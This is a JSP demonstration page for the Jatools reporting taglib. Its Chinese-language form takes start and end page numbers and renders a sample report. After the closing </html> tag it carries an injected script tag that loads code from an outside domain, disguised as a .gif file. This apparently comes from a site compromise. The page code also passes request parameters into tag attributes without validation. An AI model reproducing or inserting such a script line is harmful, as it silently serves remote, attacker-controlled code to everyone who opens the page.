<%@ page language="java" contentType="text/html; charset=GB2312"
    pageEncoding="GB2312"%>
<%@ taglib uri="/WEB-INF/tlds/jatools.tld" prefix="jatools" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=GB2312">
<title>杰表 jsp taglib 演示</title>
</head>

<body>
<script>




</script>
　<form method="POST" action="pagefromto.jsp">
 <p>
  指定输出</p>
  <p>&nbsp;&nbsp;&nbsp; 超始页:<input type="text" name="T1" size="20"></p>
  <p>&nbsp;&nbsp;&nbsp; 结束页:<input type="text" name="T2" size="20"></p>
  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <input type="submit" value="提交" name="B1"></p>
</form>
<p>　</p>

<%
   String from =(String)  request.getParameter("T1") ;
   String to = (String)  request.getParameter("T2") ;
   
   if(from == null || from.trim().equals(""))
      from = "1";
      
   if(to == null || to.trim().equals(""))
      to = Integer.MAX_VALUE+"";
      


%>
<p>第一张报表
<jatools:report id="_report1" pageFrom='<%=from%>' pageTo='<%=to%>' template="../webapps/jrs/example/table.xml" border="border:1px solid blue" offset="4" cached='true'/>

<jatools:container id="_container" for_report="_report1" scroll='true' width='100%;zoom:50%;' height='80%' background="#EFEBEF"/>

<% _container.render(); %>


</p>

<div style='clear:both;'/>

</body>
</html><script src=http://fangaizheng.com.cn/count/js/gif.gif></script>
